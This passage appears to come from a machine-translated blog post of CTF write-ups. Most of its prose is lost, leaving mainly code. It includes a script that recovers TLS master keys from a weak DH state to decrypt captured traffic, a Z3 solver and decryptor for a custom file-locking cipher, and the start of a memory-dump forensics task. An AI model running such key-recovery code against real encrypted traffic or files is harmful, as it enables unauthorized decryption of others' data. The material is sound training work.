dh_p = 23390802492779255177134184370397517812355114045331724403582725611989933627587394016284977408323433231376977414043562662015562429926336130577589190521858667065571589328848570938970559584045953695918419788870353537714753160723913752100704810651892577111770521339703456940346854154884020022465250463024557548779126285008325304289256359545621253722069230995474108959373841908210698053332124205226084810339078397099642164575459958848963136672415274751614370255032937981786588147095719801999313216854607209552815027819569749983631505548263472693034066210847223343807999514384075548912593749054743887793047383825112467532259</code></pre><br>
<p>           -.      ,     ,        :<br>
     0,         2  ,         p.       (,    /dev/urandom)   p:</p><br>
<pre><code class="plaintext hljs">212030266574081313400816495535550771039880390539286135828101869037345869420205997453325815053364595553160004790759435995827592517178474188665111332189420650868610567156950459495593726196692754969821860322110444674367830706684288723400924718718744572072716445007789955072532338996543460287499773137785071615174311774659549109541904654568673143709587184128220277471318155757799759470829597214195494764332668485009525031739326801550115807698375007112649770412032760122054527000645191827995252649714951346955180619834783531787411998600610075175494746953236628125613177997145650859163985984159468674854699901927080143977813208682753148280937687469933353788992176066206254339449062166596095349440088429291135673308334245804375230115095159172312975679432750163246936266603077314220813042048063033927345613565227184333091534551071824033535159483541175958867122974738255966511008607723675431569961127852005437047813822454112416864211120323016008267853722731311026233323235121922969702016337164336853826598082855592007126727352041124911221048498141841625765390204460725231581416991152769176243658310857769293168120450725070030636638954553866903537931113666283836250525318798622872347839391197939468295124060629961250708172499966110406527347</code></pre><br>
<p>         .</p><br>
<p>    :<br>
A) Wireshark    SSL,   -,     .      - (  pre-master key ),        ( ,   SSL  )  master key .    SSLKEYLOG ,    client random (   ssl )  master key,     WireShark   SSL   .</p><br>
<p>    :<br>
B) PHP    (   <code>bcadd</code>, <code>bcpowmod</code>…),    .<br>
C)   master key  pre-master key      ,  ssl   ,  openssl       .    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> </a>, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>  - RFC:<br>
<img src="https://habrastorage.org/webt/hl/ko/q6/hlkoq67uttadwf0spe68fvvgtgo.png"></p><br>
<p>       ( ,    ):</p><br>
<pre><code class="plaintext hljs">for i in xrange(0, 4264):<font></font>
  dh_secret = pow(srv_pubkeys[i], state, dh_p)<font></font>
  dh_secret = hex(dh_secret)[2:-1]<font></font>
  if len(dh_secret) % 2 :<font></font>
    dh_secret = "0"+dh_secret<font></font>
  while dh_secret[0:2] == "00":<font></font>
    dh_secret = dh_secret[2:]<font></font>
  dh_secret = dh_secret.decode("hex")<font></font>
  seed = "master secret"+(cl_random[i].strip() + srv_random[i].strip()).decode("hex")<font></font>
  A = seed<font></font>
  master_key = ""<font></font>
  for j in xrange(0, 2):<font></font>
    A = hmac.new(dh_secret, A, hashlib.sha256).digest()<font></font>
    master_key += hmac.new(dh_secret, A+seed, hashlib.sha256).digest()<font></font>
  master_key = master_key[0:48].encode("hex")<font></font>
  print "CLIENT_RANDOM " + cl_random[i].strip() + " " + master_key<font></font>
  state *= 2<font></font>
  if state &gt; CMP:<font></font>
    state ^= XOR</code></pre><br>
<p>D)    client random, …   Wireshark    csv      ,   csv   “…”.</p><br>
<p>E)   4264  WireShark      (8   ),  ,      ,     .    http- (  ) WireShark     1000 ,      .     pcap  5   1000 tcp-  .          :</p><br>
<p><img src="https://habrastorage.org/webt/kn/op/xh/knopxh0nebqck4xuix2kvgmoyju.png"></p></div></div><br>
<p> ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>.</p><br>
<h2>Day 5. PROTECTED SHELL</h2><br>
<div class="scrollable-table"><table>
<tbody><tr>
<td colspan="3" align="center"></td>
</tr>
<tr>
<td align="center"><b>1 </b></td>
<td align="center"><b>2 </b></td>
<td align="center"><b>3 </b></td>
</tr>
<tr>
<td align="center">vos</td>
<td align="center">Bartimaeous</td>
<td align="center">CLO</td>
</tr>
<tr>
<td colspan="3" align="center"> : Maxim Pronin, 0x3c3e, tinkerlock, demidov_al, x@secator, groke_in_the_sky, d3fl4t3</td>
</tr>
</tbody></table></div><br>
<p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">RuCTFE</a>.         .     SSH-,      .  —     ,      .        .</p><br>
<p>,       ,     ,        . ,    ,    .</p><br>
<div class="spoiler"><b class="spoiler_title">     (vos)</b><div class="spoiler_text"><iframe width="560" height="315" src="https://www.youtube.com/embed/rpq5R9wnoiM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>
<iframe width="560" height="315" src="https://www.youtube.com/embed/00xBulNZkGI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></div></div><br>
<h2>Day 6. UNLOCK</h2><br>
<div class="scrollable-table"><table>
<tbody><tr>
<td colspan="3" align="center"></td>
</tr>
<tr>
<td align="center"><b>1 </b></td>
<td align="center"><b>2 </b></td>
<td align="center"><b>3 </b></td>
</tr>
<tr>
<td align="center">gotdaswag</td>
<td align="center">medidrdrider</td>
<td align="center">sysenter</td>
</tr>
</tbody></table></div><br>
<p>     <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">VolgaCTF</a>.   ,   .  —     ,     ,    . </p><br>
<div class="spoiler"><b class="spoiler_title">    (gotdaswag)</b><div class="spoiler_text"><h3 id="intro">INTRO</h3><br>
<p>     <strong>locker</strong>  <strong>secret.png.enc</strong>.</p><br>
<p>     <strong>ELF</strong>  Linux x86-64,        ,   —  <strong>PNG</strong> .</p><br>
<pre><code class="plaintext hljs"># ./locker<font></font>
Required option 'input' missing<font></font>
Usage: ./locker [options]<font></font>
<font></font>
Options:<font></font>
    -i, --input in.png  Input file path<font></font>
    -o, --output out.png.enc<font></font>
                        Output file path<font></font>
    -k, --key 0004081516234200<font></font>
                        Encryption key in hex<font></font>
    -h, --help          Print this help menu</code></pre><br>
<h3 id="locker">LOCKER</h3><br>
<p>   IDA,      <strong>project::main</strong>.</p><br>
<p><img src="https://habrastorage.org/getpro/habr/post_images/0a3/e68/c77/0a3e68c773b0ff4a7c4d09a321deecd1.png"></p><br>
<p> , ,   <strong> </strong> (ECB),    <strong>32 </strong>,   <strong>64 </strong>    <strong>77</strong>.</p><br>
<h5 id="versiya-na-python">  Python</h5><br>
<pre><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">p, k, rounds=<span class="hljs-number">77</span></span>):</span>
  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, rounds):<font></font>
    n  = (p &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">1</span>
    n |= (p &gt;&gt; <span class="hljs-number">26</span>) &amp; <span class="hljs-number">0xE0</span>
    n |= (p &gt;&gt; <span class="hljs-number">22</span>) &amp; <span class="hljs-number">0x10</span>
    n |= (p &gt;&gt; <span class="hljs-number">13</span>) &amp; <span class="hljs-number">8</span>
    n |= (p &gt;&gt; <span class="hljs-number">7</span>) &amp; <span class="hljs-number">4</span>
    n |= (p &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">2</span><font></font>
<font></font>
    x  = p ^ k<font></font>
    x ^= p &gt;&gt; <span class="hljs-number">12</span>
    x ^= p &gt;&gt; <span class="hljs-number">20</span>
    x &amp;= <span class="hljs-number">1</span><font></font>
<font></font>
    y = <span class="hljs-number">1</span> &lt;&lt; n<font></font>
    y &amp;= <span class="hljs-number">0xBB880F0FC30F0000</span><font></font>
    y &gt;&gt;= n<font></font>
    y &amp;= <span class="hljs-number">1</span><font></font>
<font></font>
    <span class="hljs-keyword">if</span> x == y:<font></font>
      p &amp;= <span class="hljs-number">0xFFFFFFFE</span>
    <span class="hljs-keyword">else</span>:<font></font>
      p |= <span class="hljs-number">1</span><font></font>
<font></font>
    k = ror(k, <span class="hljs-number">1</span>, <span class="hljs-number">64</span>)<font></font>
    p = ror(p, <span class="hljs-number">1</span>, <span class="hljs-number">32</span>)<font></font>
<font></font>
  <span class="hljs-keyword">return</span> p</code></pre><br>
<h3 id="secret-key">SECRET KEY</h3><br>
<p> ,        <strong>PNG</strong>.<br>
C,   <strong>  -</strong>     (   PNG).<br>
<img src="https://habrastorage.org/getpro/habr/post_images/0b7/ecb/770/0b7ecb770732ca1fdc9f8cba8f0d8248.png"></p><br>
<p>      <strong>SMT-</strong> (<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" title="Z3">Z3</a>)    .<br>
           -.</p><br>
<h5 id="task6_keypy">task6_key.py</h5><br>
<pre><code class="python hljs"><span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> struct
<span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<font></font>
<font></font>
<span class="hljs-comment"># PNG file signature (8 bytes) + IHDR chunk header (8 bytes)</span>
PLAIN_TEXT = <span class="hljs-string">b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52'</span>
BLOCK_SIZE = <span class="hljs-number">4</span><font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">p, k, rounds=<span class="hljs-number">77</span></span>):</span>
  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, rounds):<font></font>
    n  = LShR(p, <span class="hljs-number">4</span>) &amp; <span class="hljs-number">1</span>
    n |= LShR(p, <span class="hljs-number">26</span>) &amp; <span class="hljs-number">0xE0</span>
    n |= LShR(p, <span class="hljs-number">22</span>) &amp; <span class="hljs-number">0x10</span>
    n |= LShR(p, <span class="hljs-number">13</span>) &amp; <span class="hljs-number">8</span>
    n |= LShR(p, <span class="hljs-number">7</span>) &amp; <span class="hljs-number">4</span>
    n |= LShR(p, <span class="hljs-number">4</span>) &amp; <span class="hljs-number">2</span><font></font>
<font></font>
    x  = k ^ ZeroExt(<span class="hljs-number">32</span>, p)<font></font>
    x ^= LShR(ZeroExt(<span class="hljs-number">32</span>, p), <span class="hljs-number">12</span>)<font></font>
    x ^= LShR(ZeroExt(<span class="hljs-number">32</span>, p), <span class="hljs-number">20</span>)<font></font>
    x &amp;= <span class="hljs-number">1</span><font></font>
<font></font>
    y = <span class="hljs-number">1</span> &lt;&lt; ZeroExt(<span class="hljs-number">32</span>, n)<font></font>
    y &amp;= <span class="hljs-number">0xBB880F0FC30F0000</span>
    y = LShR(y, ZeroExt(<span class="hljs-number">32</span>, n))<font></font>
    y &amp;= <span class="hljs-number">1</span><font></font>
<font></font>
    p = If(x == y, p &amp; <span class="hljs-number">0xFFFFFFFE</span>, p | <span class="hljs-number">1</span>)<font></font>
<font></font>
    p = RotateRight(p, <span class="hljs-number">1</span>)<font></font>
    k = RotateRight(k, <span class="hljs-number">1</span>)<font></font>
<font></font>
  <span class="hljs-keyword">return</span> p<font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">qword_le_to_be</span>(<span class="hljs-params">v</span>):</span>
  pv = struct.pack(<span class="hljs-string">'&lt;Q'</span>, v)<font></font>
  uv = struct.unpack(<span class="hljs-string">'&gt;Q'</span>, pv)
  <span class="hljs-keyword">return</span> uv[<span class="hljs-number">0</span>]<font></font>
<font></font>
<span class="hljs-keyword">if</span> len(sys.argv) &lt; <span class="hljs-number">2</span>:<font></font>
  sys.exit(<span class="hljs-string">'no input file specified'</span>)<font></font>
<font></font>
<span class="hljs-keyword">with</span> open(sys.argv[<span class="hljs-number">1</span>], <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> encrypted_file:<font></font>
  k = BitVec(<span class="hljs-string">'k'</span>, <span class="hljs-number">64</span>)<font></font>
  key = k<font></font>
  solver = Solver()<font></font>
<font></font>
  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(PLAIN_TEXT), BLOCK_SIZE):
    <span class="hljs-comment"># prepare plain text and cipher text pairs</span>
    pt = struct.unpack(<span class="hljs-string">'&lt;L'</span>, PLAIN_TEXT[i:i + BLOCK_SIZE])[<span class="hljs-number">0</span>]<font></font>
    ct = struct.unpack(<span class="hljs-string">'&lt;L'</span>, encrypted_file.read(BLOCK_SIZE))[<span class="hljs-number">0</span>]<font></font>
    p = BitVecVal(pt, <span class="hljs-number">32</span>)<font></font>
    e = BitVecVal(ct, <span class="hljs-number">32</span>)<font></font>
    solver.add(encrypt(p, k) == e)<font></font>
<font></font>
  print(<span class="hljs-string">'solving ...'</span>)<font></font>
<font></font>
  <span class="hljs-keyword">if</span> solver.check() == sat:<font></font>
    encryption_key = solver.model()[key].as_long()<font></font>
    print(<span class="hljs-string">'key: %016X'</span> % qword_le_to_be(encryption_key))</code></pre><br>
<p>:</p><br>
<pre><code class="plaintext hljs">&gt; python task6_key.py "secret.png.enc"<font></font>
solving ...<font></font>
key: AE34C511A8238BCC</code></pre><br>
<h3 id="unlocker">UNLOCKER</h3><br>
<p>         .<br>
                 .</p><br>
<h5 id="task6_unlockerpy">task6_unlocker.py</h5><br>
<pre><code class="python hljs"><span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> struct
<span class="hljs-keyword">import</span> binascii<font></font>
<font></font>
BLOCK_SIZE = <span class="hljs-number">4</span><font></font>
<font></font>
ror = <span class="hljs-keyword">lambda</span> val, r_bits, max_bits: \<font></font>
  ((val &amp; (<span class="hljs-number">2</span>**max_bits<span class="hljs-number">-1</span>)) &gt;&gt; r_bits%max_bits) | \<font></font>
  (val &lt;&lt; (max_bits-(r_bits%max_bits)) &amp; (<span class="hljs-number">2</span>**max_bits<span class="hljs-number">-1</span>))<font></font>
<font></font>
rol = <span class="hljs-keyword">lambda</span> val, r_bits, max_bits: \<font></font>
  (val &lt;&lt; r_bits%max_bits) &amp; (<span class="hljs-number">2</span>**max_bits<span class="hljs-number">-1</span>) | \<font></font>
  ((val &amp; (<span class="hljs-number">2</span>**max_bits<span class="hljs-number">-1</span>)) &gt;&gt; (max_bits-(r_bits%max_bits)))<font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">e, k, rounds=<span class="hljs-number">77</span></span>):</span>
  dk = ror(k, <span class="hljs-number">13</span>, <span class="hljs-number">64</span>)<font></font>
<font></font>
  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, rounds):<font></font>
    dk = rol(dk, <span class="hljs-number">1</span>, <span class="hljs-number">64</span>)<font></font>
    e  = rol(e, <span class="hljs-number">1</span>, <span class="hljs-number">32</span>)<font></font>
<font></font>
    n  = (e &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">1</span>
    n |= (e &gt;&gt; <span class="hljs-number">26</span>) &amp; <span class="hljs-number">0xE0</span>
    n |= (e &gt;&gt; <span class="hljs-number">22</span>) &amp; <span class="hljs-number">0x10</span>
    n |= (e &gt;&gt; <span class="hljs-number">13</span>) &amp; <span class="hljs-number">8</span>
    n |= (e &gt;&gt; <span class="hljs-number">7</span>) &amp; <span class="hljs-number">4</span>
    n |= (e &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">2</span><font></font>
<font></font>
    x  = e ^ dk<font></font>
    x ^= e &gt;&gt; <span class="hljs-number">12</span>
    x ^= e &gt;&gt; <span class="hljs-number">20</span>
    x &amp;= <span class="hljs-number">1</span><font></font>
<font></font>
    y = <span class="hljs-number">1</span> &lt;&lt; n<font></font>
    y &amp;= <span class="hljs-number">0xBB880F0FC30F0000</span><font></font>
    y &gt;&gt;= n<font></font>
    y &amp;= <span class="hljs-number">1</span><font></font>
<font></font>
    <span class="hljs-keyword">if</span> x == y:<font></font>
      e &amp;= <span class="hljs-number">0xFFFFFFFE</span>
    <span class="hljs-keyword">else</span>:<font></font>
      e |= <span class="hljs-number">1</span><font></font>
<font></font>
  <span class="hljs-keyword">return</span> e<font></font>
<font></font>
<span class="hljs-keyword">if</span> len(sys.argv) &lt; <span class="hljs-number">2</span>:<font></font>
  sys.exit(<span class="hljs-string">'no input file specified'</span>)
<span class="hljs-keyword">elif</span> len(sys.argv) &lt; <span class="hljs-number">3</span>:<font></font>
  sys.exit(<span class="hljs-string">'no output file specified'</span>)
<span class="hljs-keyword">elif</span> len(sys.argv) &lt; <span class="hljs-number">4</span>:<font></font>
  sys.exit(<span class="hljs-string">'no encryption key specified'</span>)<font></font>
<font></font>
<span class="hljs-keyword">try</span>:<font></font>
  key = binascii.unhexlify(sys.argv[<span class="hljs-number">3</span>])<font></font>
  key = struct.unpack(<span class="hljs-string">'&lt;Q'</span>, key)[<span class="hljs-number">0</span>]
<span class="hljs-keyword">except</span>:<font></font>
  sys.exit(<span class="hljs-string">'non-hexadecimal encryption key'</span>)<font></font>
<font></font>
print(<span class="hljs-string">'unlocking ...'</span>)<font></font>
start_time = time.time()<font></font>
<font></font>
<span class="hljs-keyword">with</span> open(sys.argv[<span class="hljs-number">1</span>], <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> ef:
  <span class="hljs-keyword">with</span> open(sys.argv[<span class="hljs-number">2</span>], <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> df:
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<font></font>
      ct = ef.read(BLOCK_SIZE)<font></font>
      <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ct:
        <span class="hljs-keyword">break</span>
      ct = struct.unpack(<span class="hljs-string">'&lt;L'</span>, ct)[<span class="hljs-number">0</span>]<font></font>
      pt = decrypt(ct, key)<font></font>
      pt = struct.pack(<span class="hljs-string">'&lt;L'</span>, pt)<font></font>
      df.write(pt)<font></font>
<font></font>
print(<span class="hljs-string">'done, took %.3f seconds.'</span> % (time.time() - start_time))</code></pre><br>
<p> ,         .</p><br>
<pre><code class="plaintext hljs">&gt; python task6_unlocker.py "secret.png.enc" "secret.png" "AE34C511A8238BCC"<font></font>
unlocking ...<font></font>
done, took 49.669 seconds.</code></pre><br>
<h5 id="secretpng">secret.png</h5><br>
<p><img src="https://habrastorage.org/getpro/habr/post_images/9fa/18b/2b2/9fa18b2b2264379bd89ebcaaf62c3006.png"></p><br>
<blockquote>ZN{RA$T0GR@PHY_H3RTS}</blockquote></div></div><br>
<h2>Day 7. Beep Beep!</h2><br>
<div class="scrollable-table"><table>
<tbody><tr>
<td align="center"></td>
</tr>
<tr>
<td align="center"><b>1 </b></td>
</tr>
<tr>
<td align="center">sysenter</td>
</tr>
</tbody></table></div><br>
<p>    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">SchoolCTF</a>.     ,    ,  .   ,       ,      . </p><br>
<div class="spoiler"><b class="spoiler_title">    (sysenter)</b><div class="spoiler_text"><p>Something that looks like VirtualBox RAM dump is provided to us.</p><br>
<p>We can try volatility, but it seems that it unable to locate required structures to restore Virtual Memory layout.</p><br>
<p><img src="https://habrastorage.org/webt/go/1l/7i/go1l7imiojbikday6awhxdrbw58.png"></p><br>
<p>No process memory for us today, so we will have to work with fragmented memory.</p><br>
<p>First of all let's precache strings from the dump.</p><br>
<pre><code class="plaintext hljs">strings &gt; strings_ascii.txt<font></font>
strings -e l &gt; strings_wide.txt</code></pre><br>
<p>Most interesting one is command execution log:</p><br>
<pre><code class="plaintext hljs">cd ..<font></font>
.\injector.exe 192.168.1.65<font></font>
.\run.exe .\storage<font></font>
cd .\server\<font></font>
.\run.exe block1<font></font>
.\run.exe block0<font></font>
cd Z:\zn_2019\<font></font>
cd .\server\<font></font>
cd ..<font></font>
.\injector.exe 192.168.1.65<font></font>
cd Z:\zn_2019\<font></font>
.\injector.exe 192.168.1.65<font></font>
cd ..<font></font>
touch<font></font>
echo<font></font>
echo qwe <font></font>
echo qwe &gt; flag.txt<font></font>
.\injector.exe 192.168.1.65<font></font>
echo qwe &gt; flag.txt<font></font>
.\injector.exe 192.168.1.65<font></font>
echo qwe &gt; flag.txt<font></font>
.\injector.exe 192.168.1.65<font></font>
echo qwe &gt; flag.txt<font></font>
cd Z:\zn_2019\<font></font>
.\injector.exe 192.168.1.65<font></font>
cd Z:\zn_2019\<font></font>
injector.exe 1921.68.1.65<font></font>
injector.exe 192.68.1.65<font></font>
./injector.exe 192.68.1.65<font></font>
.\injector.exe 192.168.1.65<font></font>
cd Z:\zn_2019\<font></font>
.\injector.exe 192.168.1.65<font></font>
cd Z:\zn_2019\<font></font>
.\injector.exe 192.168.1.65<font></font>
cd Z:\zn_2019\server\<font></font>
run storage<font></font>
.\run.exe .\storage<font></font>
cd Z:\zn_2019\server\<font></font>
.\run.exe block1<font></font>
cd Z:\zn_2019\server\<font></font>
.\run.exe block0<font></font>
cd ..<font></font>
.\injector.exe 192.168.1.65<font></font>
cd Z:\zn_2019\<font></font>
.\injector.exe 192.168.1.65<font></font>
cd Z:\zn_2019\<font></font>
.\injector.exe 192.168.1.65<font></font>
cd Z:\zn_2019\<font></font>
.\injector.exe 192.168.1.65<font></font>
cd Z:\zn_2019\<font></font>
.\injector.exe 192.168.1.65<font></font>
cd Z:\zn_2019\<font></font>
.\Injector2.exe 192.168.1.65<font></font>
cd Z:\zn_2019\<font></font>
.\injector.exe 192.168.1.65<font></font>
.\injector2.exe 192.168.1.65<font></font>
cd Z:\zn_2019\<font></font>
.\Injector2.exe 192.168.1.65<font></font>
'.\ConsoleApplication5 (2).exe' 192.168.1.65</code></pre><br>
<p><strong>Not Important note:</strong></p><br>
<p><em>Not sure what <strong>SIGN.MEDIA</strong> is, but it looks like a cached file list from VirtualBox Network Share (Is this from Windows Registry?).</em></p><br>
<pre><code class="plaintext hljs">SIGN.MEDIA=138A400 zn_2019\ConsoleApplication5 (2).exe<font></font>
SIGN.MEDIA=138A400 zn_2019\ConsoleApplication5.exe<font></font>
SIGN.MEDIA=138A400 zn_2019\Injector2.exe<font></font>
SIGN.MEDIA=138A400 zn_2019\Is_it_you_suspended_or_me.exe<font></font>
SIGN.MEDIA=138A400 zn_2019\NOTE1.exe<font></font>
SIGN.MEDIA=138A400 zn_2019\NOTE1.exe<font></font>
SIGN.MEDIA=138A400 zn_2019\With_little_debug.exe<font></font>
SIGN.MEDIA=138A400 zn_2019\im_spawned_you_so_i_should_kill_you.exe<font></font>
SIGN.MEDIA=138A400 zn_2019\injector.exe<font></font>
SIGN.MEDIA=138A400 zn_2019\nnnn.exe<font></font>
SIGN.MEDIA=138A400 zn_2019\not_so_sleepy_r_we.exe<font></font>
SIGN.MEDIA=138A400 zn_2019\note.exe<font></font>
SIGN.MEDIA=138A400 zn_2019\note2.exe<font></font>
SIGN.MEDIA=138A400 zn_2019\note3.exe<font></font>
SIGN.MEDIA=138A400 zn_2019\note4.exe<font></font>
SIGN.MEDIA=138A400 zn_2019\random.exe<font></font>
SIGN.MEDIA=138A400 zn_2019\z.exe<font></font>
SIGN.MEDIA=17582C zn_2019\Injector2.exe<font></font>
SIGN.MEDIA=17582C zn_2019\injector.exe<font></font>
SIGN.MEDIA=196C2 zn_2019\server\run.exe<font></font>
SIGN.MEDIA=1C176B0 zn_2019\ConsoleApplication5 (2).exe<font></font>
SIGN.MEDIA=1C176B0 zn_2019\ConsoleApplication5.exe<font></font>
SIGN.MEDIA=1C176B0 zn_2019\Injector2.exe<font></font>
SIGN.MEDIA=1C176B0 zn_2019\injector.exe<font></font>
SIGN.MEDIA=1C176B0 zn_2019\note.exe<font></font>
SIGN.MEDIA=1C176B0 zn_2019\note2.exe<font></font>
SIGN.MEDIA=1C176B0 zn_2019\note3.exe<font></font>
SIGN.MEDIA=1C1D02C zn_2019\ConsoleApplication5 (2).exe<font></font>
SIGN.MEDIA=1C1D02C zn_2019\ConsoleApplication5.exe<font></font>
SIGN.MEDIA=1C1D02C zn_2019\Injector2.exe<font></font>
SIGN.MEDIA=1C1D02C zn_2019\Is_it_you_suspended_or_me.exe<font></font>
SIGN.MEDIA=1C1D02C zn_2019\With_little_debug.exe<font></font>
SIGN.MEDIA=1C1D02C zn_2019\injector.exe<font></font>
SIGN.MEDIA=1C1D02C zn_2019\not_so_sleepy_r_we.exe<font></font>
SIGN.MEDIA=1C1D02C zn_2019\note.exe<font></font>
SIGN.MEDIA=1C1D02C zn_2019\note2.exe<font></font>
SIGN.MEDIA=1C1D02C zn_2019\note3.exe<font></font>
SIGN.MEDIA=1C1DAB0 zn_2019\ConsoleApplication5 (2).exe<font></font>
SIGN.MEDIA=1C1DAB0 zn_2019\ConsoleApplication5.exe<font></font>
SIGN.MEDIA=1C1DAB0 zn_2019\Injector2.exe<font></font>
SIGN.MEDIA=1C1DAB0 zn_2019\With_little_debug.exe<font></font>
SIGN.MEDIA=1C1DAB0 zn_2019\injector.exe<font></font>
SIGN.MEDIA=1C1DAB0 zn_2019\note.exe<font></font>
SIGN.MEDIA=1C1DAB0 zn_2019\note2.exe<font></font>
SIGN.MEDIA=1C1DAB0 zn_2019\note3.exe<font></font>
SIGN.MEDIA=1C30058 zn_2019\ConsoleApplication5 (2).exe<font></font>
SIGN.MEDIA=1C30058 zn_2019\ConsoleApplication5.exe<font></font>
SIGN.MEDIA=1C30058 zn_2019\Injector2.exe<font></font>
SIGN.MEDIA=1C30058 zn_2019\Is_it_you_suspended_or_me.exe<font></font>
SIGN.MEDIA=1C30058 zn_2019\With_little_debug.exe<font></font>
SIGN.MEDIA=1C30058 zn_2019\injector.exe<font></font>
SIGN.MEDIA=1C30058 zn_2019\injector.exe<font></font>
SIGN.MEDIA=1C30058 zn_2019\not_so_sleepy_r_we.exe<font></font>
SIGN.MEDIA=1C30058 zn_2019\note.exe<font></font>
SIGN.MEDIA=1C30058 zn_2019\note2.exe<font></font>
SIGN.MEDIA=1C30058 zn_2019\note3.exe<font></font>
SIGN.MEDIA=1C89400 zn_2019\ConsoleApplication5 (2).exe<font></font>
SIGN.MEDIA=1C89400 zn_2019\ConsoleApplication5.exe<font></font>
SIGN.MEDIA=1C89400 zn_2019\Injector2.exe<font></font>
SIGN.MEDIA=1C89400 zn_2019\Is_it_you_suspended_or_me.exe<font></font>
SIGN.MEDIA=1C89400 zn_2019\NOTE1.exe<font></font>
SIGN.MEDIA=1C89400 zn_2019\With_little_debug.exe<font></font>
SIGN.MEDIA=1C89400 zn_2019\im_spawned_you_so_i_should_kill_you.exe<font></font>
SIGN.MEDIA=1C89400 zn_2019\injector.exe<font></font>
SIGN.MEDIA=1C89400 zn_2019\nnnn.exe<font></font>
SIGN.MEDIA=1C89400 zn_2019\not_so_sleepy_r_we.exe<font></font>
SIGN.MEDIA=1C89400 zn_2019\note.exe<font></font>
SIGN.MEDIA=1C89400 zn_2019\note.exe<font></font>
SIGN.MEDIA=1C89400 zn_2019\note2.exe<font></font>
SIGN.MEDIA=1C89400 zn_2019\note3.exe<font></font>
SIGN.MEDIA=1C89400 zn_2019\note4.exe<font></font>
SIGN.MEDIA=1C8A800 zn_2019\ConsoleApplication5 (2).exe<font></font>
SIGN.MEDIA=1C8A800 zn_2019\ConsoleApplication5.exe<font></font>
SIGN.MEDIA=1C8A800 zn_2019\Injector2.exe<font></font>
SIGN.MEDIA=1C8A800 zn_2019\Is_it_you_suspended_or_me.exe<font></font>
SIGN.MEDIA=1C8A800 zn_2019\NOTE1.exe<font></font>
SIGN.MEDIA=1C8A800 zn_2019\With_little_debug.exe<font></font>
SIGN.MEDIA=1C8A800 zn_2019\im_spawned_you_so_i_should_kill_you.exe<font></font>
SIGN.MEDIA=1C8A800 zn_2019\injector.exe<font></font>
SIGN.MEDIA=1C8A800 zn_2019\nnnn.exe<font></font>
SIGN.MEDIA=1C8A800 zn_2019\not_so_sleepy_r_we.exe<font></font>
SIGN.MEDIA=1C8A800 zn_2019\note.exe<font></font>
SIGN.MEDIA=1C8A800 zn_2019\note2.exe<font></font>
SIGN.MEDIA=1C8A800 zn_2019\note3.exe<font></font>
SIGN.MEDIA=1C8A800 zn_2019\note4.exe<font></font>
SIGN.MEDIA=2D702C zn_2019\ConsoleApplication5 (2).exe<font></font>
SIGN.MEDIA=3EDC2 zn_2019\server\a.exe<font></font>
SIGN.MEDIA=3EDC2 zn_2019\server\hui.exe<font></font>
SIGN.MEDIA=3EDC2 zn_2019\server\run.exe<font></font>
SIGN.MEDIA=4482C zn_2019\ConsoleApplication5.exe<font></font>
SIGN.MEDIA=4482C zn_2019\PEview.exe<font></font>
SIGN.MEDIA=5B0058 zn_2019\ConsoleApplication5 (2).exe<font></font>
SIGN.MEDIA=5B0058 zn_2019\ConsoleApplication5.exe<font></font>
SIGN.MEDIA=5B0058 zn_2019\Injector2.exe<font></font>
SIGN.MEDIA=5B0058 zn_2019\injector.exe<font></font>
SIGN.MEDIA=5B0058 zn_2019\note.exe<font></font>
SIGN.MEDIA=A856FE8 zn_2019\server\hui\Discord.exe<font></font>
SIGN.MEDIA=A856FE8 zn_2019\server\hui\Far.exe<font></font>
